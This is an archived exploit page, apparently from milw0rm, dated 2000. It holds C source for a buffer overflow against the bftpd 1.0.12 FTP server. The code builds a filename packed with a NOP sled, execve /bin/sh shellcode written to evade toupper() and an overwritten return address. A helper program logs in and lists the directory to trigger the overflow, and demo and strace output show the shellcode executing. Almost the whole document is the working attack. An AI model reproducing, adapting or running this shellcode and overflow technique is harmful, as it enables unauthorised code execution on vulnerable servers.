<html><head><title>BFTPd 1.0.12 Remote Exploit</title></head><pre>/*                                                                                                                                             
  Creates a filname to exploit the bug in bftpd 1.0.12                                                                                           
  Create the file, cwd in the shell directory and nlist the file directory.  

  Coded by korty &lt;cb@grolier.fr&gt;
*/

#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;


#define LEN 205

int main (int argc, char **argv)
{
  char buf[LEN + 12];
  int  ret = 0xbffffa80;
  int  *p;
  int  fp;
  
  char code[]=

 /*
  *  Linux/x86
  *
  *  toupper() evasion, standard execve() /bin/sh (used eg. in various
  *  imapd exploits). Goes through a loop adding 0x20 to the 
  *  (/bin/sh -= 0x20) string (ie. yields /bin/sh after addition).
  */

  /* main: */
  &quot;\xeb\x29&quot;                            /* jmp callz                   */
  /* start: */
  &quot;\x5e&quot;                                /* popl %esi                   */
  &quot;\x29\xc9&quot;                            /* subl %ecx, %ecx             */
  &quot;\x89\xf3&quot;                            /* movl %esi, %ebx             */
  &quot;\x89\x5e\x08&quot;                        /* movl %ebx, 0x08(%esi)       */
  &quot;\xb1\x07&quot;                            /* movb $0x07, %cl             */
  /* loopz: */
  &quot;\x80\x03\x20&quot;                        /* addb $0x20, (%ebx)          */
  &quot;\x43&quot;                                /* incl %ebx                   */
  &quot;\xe0\xfa&quot;                            /* loopne loopz                */
  &quot;\x29\xc0&quot;                            /* subl %eax, %eax             */
  &quot;\x88\x46\x07&quot;                        /* movb %al, 0x07(%esi)        */
  &quot;\x89\x46\x0c&quot;                        /* movl %eax, 0x0c(%esi)       */
  &quot;\xb0\x0b&quot;                            /* movb $0x0b, %al             */
  &quot;\x87\xf3&quot;                            /* xchgl %esi, %ebx            */
  &quot;\x8d\x4b\x08&quot;                        /* leal 0x08(%ebx), %ecx       */
  &quot;\x8d\x53\x0c&quot;                        /* leal 0x0c(%ebx), %edx       */
  &quot;\xcd\x80&quot;                            /* int $0x80                   */
  &quot;\x29\xc0&quot;                            /* subl %eax, %eax             */
  &quot;\x40&quot;                                /* incl %eax                   */
  &quot;\xcd\x80&quot;                            /* int $0x80                   */
  /* callz: */
  &quot;\xe8\xd2\xff\xff\xff&quot;                /* call start                  */
  &quot;\x0f\x42\x49\x4e\x0f\x53\x48&quot;;       /* /bin/sh -= 0x20             */



  if (argc &gt; 1) {
    ret += atoi(argv[1]);
    fprintf(stderr, &quot;Using ret %#010x\n&quot;, ret);
  }

  memset(buf, '\x90', LEN);
  memcpy(buf + LEN - strlen(code), code, strlen(code));

  p = (int *) (buf + LEN);

  *p++ = ret;
  *p++ = ret;
  *p   = 0;

  fp = open(buf, O_CREAT);
  if(fp &lt; 0) perror(&quot;buf&quot;);
  close(fp);

}
/*

-- BEGIN list.c --


#include &lt;stdio.h&gt;

int main()

{

#define USER &quot;cb&quot;
#define PASS &quot;PasSwoRd&quot;
#define PORT &quot;port 127,0,0,1,4,4&quot;  // Data on the port 1028 with the addr 127.0.0.1
#define CWD &quot;cwd longfile&quot;
#define LIST &quot;list&quot;

printf(&quot;user %s\n&quot;, USER);
sleep(1);
printf(&quot;pass %s\n&quot;, PASS);
sleep(1);
printf(&quot;%s\n&quot;, PORT);
sleep(1);
printf(&quot;%s\n&quot;, CWD);
sleep(1);
printf(&quot;%s\n&quot;, LIST);

}


-- END list.c --







  A)  DEMO  


tshaw:~/longfile$ gcc -o exploit exploit.c 
tshaw:~/longfile$ ls
exploit*  exploit.c  list.c
tshaw:~/longfile$ ls
exploit*  exploit.c  list.c
tshaw:~/longfile$ ./exploit 
tshaw:~/longfile$ ls
exploit*
exploit.c
list.c
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\313)^)\311\211\323\211^\b\221\a\200\003\ C
\300\332)\300\210F\a\211F\f\220\v\203\323\211K\b\211S\f\311\200)\300\@\311\200\310\322\333
\333\333\013BIN\013SH\200\332\333\233\200\332\333\233*
tshaw:~/longfile$ 

tshaw:~/longfile$ gcc -o list list.c

tshaw:~/longfile$ nc -l -p 1028 &amp;
[1] 29973
tshaw:~/longfile$ 


tshaw:~/longfile$ (./list ; cat) | nc localhost 21
220 bftpd 1.0.12 at 127.0.0.1 ready.
331 Password please.
230 User logged in.
200 PORT 127.0.0.1:1028 OK
250 OK

150 Data connection established.
drwxr-xr-x   2 1000     100          4096 Dec  8 04:06 .
drwxr-xr-x  55 1000     100          4096 Dec  8 04:02 ..
-rw-r--r--   1 1000     100           323 Dec  8 04:06 list.c
-rwxr-xr-x   1 1000     100         11931 Dec  8 04:06 list
-rw-r--r--   1 1000     100          2178 Dec  8 03:54 exploit.c
-rwxr-xr-x   1 1000     100         12861 Dec  8 03:56 exploit
-r-xr--r--   1 1000     100             0 Dec  8 03:56 &amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;
&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;
&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;?^)??? C&amp;#29481;)&amp;#54594;F&amp;#45935;
                                                                 ?
                                                                  &amp;#45665;&amp;#46858;S
                                                                       ?)??&amp;#33048;&amp;#63735;&amp;#63735;&amp;#63735;BINSH&amp;#128;????

[1]+  Done                    nc -l -p 1028
tshaw:~/longfile$ 



   B)  STRACE OUTPUT


tshaw:~# ps -aef |grep bftpd

cb       30128    62  0 Dec04 ?        00:00:00 bftpd
root     30136 30024  0 Dec04 ttyqa    00:00:00 grep bftpd

tshaw:~# strace -p 30128

read(0, &quot;\n&quot;, 4096)                     = 1
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 4
setsockopt(4, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
setsockopt(4, SOL_SOCKET, SO_SNDBUF, [65536], 4) = 0
bind(4, {sin_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}}, 16) = 0
connect(4, {sin_family=AF_INET, sin_port=htons(1028), sin_addr=inet_addr(&quot;127.0.0.1&quot;)}}, 16) = 0
write(2, &quot;150 Data connection established.&quot;..., 34) = 34
open(&quot;/dev/null&quot;, O_RDONLY|O_NONBLOCK|0x10000) = -1 ENOENT (No such file or directory)
stat(&quot;.&quot;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
open(&quot;.&quot;, O_RDONLY|O_NONBLOCK|0x10000)  = 5
fstat(5, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
fcntl(5, F_SETFD, FD_CLOEXEC)           = 0
brk(0x8052000)                          = 0x8052000
getdents(5, /* 7 entries */, 3933)      = 328
stat(&quot;./.&quot;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
send(4, &quot;drwxr-xr-x   2 1000     100     &quot;..., 58, 0) = 58
stat(&quot;./..&quot;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
send(4, &quot;drwxr-xr-x  55 1000     100     &quot;..., 59, 0) = 59
stat(&quot;./list.c&quot;, {st_mode=S_IFREG|0644, st_size=323, ...}) = 0
send(4, &quot;-rw-r--r--   1 1000     100     &quot;..., 63, 0) = 63
stat(&quot;./list&quot;, {st_mode=S_IFREG|0755, st_size=11931, ...}) = 0
send(4, &quot;-rwxr-xr-x   1 1000     100     &quot;..., 61, 0) = 61
stat(&quot;./exploit.c&quot;, {st_mode=S_IFREG|0644, st_size=2178, ...}) = 0
send(4, &quot;-rw-r--r--   1 1000     100     &quot;..., 66, 0) = 66
stat(&quot;./exploit&quot;, {st_mode=S_IFREG|0755, st_size=12861, ...}) = 0
send(4, &quot;-rwxr-xr-x   1 1000     100     &quot;..., 64, 0) = 64
stat(&quot;./&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;?
&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47537;&amp;#47662;)^)??? C&amp;#29481;)&amp;#54594;F&amp;#45935;
                  ?
                   &amp;#45665;&amp;#46858;S
                        ?)??&amp;#33048;&amp;#63735;&amp;#63735;&amp;#63735;BINSH&amp;#128;????, {st_mode=S_IFREG|S_ISUID|0544, st_size=0, ...}) = 0
send(4, &quot;-r-xr--r--   1 1000     100     &quot;..., 270, 0) = 270
execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], [/* 0 vars */]) = -1 ENOENT (No such file or directory)
_exit(-1073743151)                      = ?

tshaw:~# 

*/


// milw0rm.com [2000-12-11]</pre></html>